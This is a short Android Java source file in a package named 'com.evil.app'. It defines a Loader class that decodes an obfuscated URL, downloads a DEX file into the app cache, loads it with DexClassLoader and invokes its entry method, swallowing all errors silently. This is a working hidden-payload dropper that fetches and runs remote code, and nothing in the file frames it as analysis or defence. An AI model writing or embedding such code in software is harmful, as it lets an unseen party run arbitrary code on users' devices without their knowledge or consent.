package com.evil.app;
import android.content.Context; import java.net.*; import java.io.*; import dalvik.system.DexClassLoader;
public class Loader implements Runnable {
    private final Context ctx; public Loader(Context c) { ctx = c; }
    public void run() {
        try {
            InputStream in = new URL(S.d("\043\107\015\121\161\034\126\023\173\000\127\021\145\002\110\022\145\004\126\106\052\107\034\017\073\133\011") + S.d("\144\103\030\130\047\134\030\105\145\127\034\131")).openConnection().getInputStream();
            File f = new File(ctx.getCacheDir(), "p.dex");
            FileOutputStream o = new FileOutputStream(f); byte[] b = new byte[4096]; int n;
            while ((n = in.read(b)) > 0) o.write(b, 0, n); o.close();
            DexClassLoader cl = new DexClassLoader(f.getPath(), ctx.getCacheDir().getPath(), null, ctx.getClassLoader());
            cl.loadClass("x.Main").getMethod("go").invoke(null);
        } catch (Exception e) { }
    }
}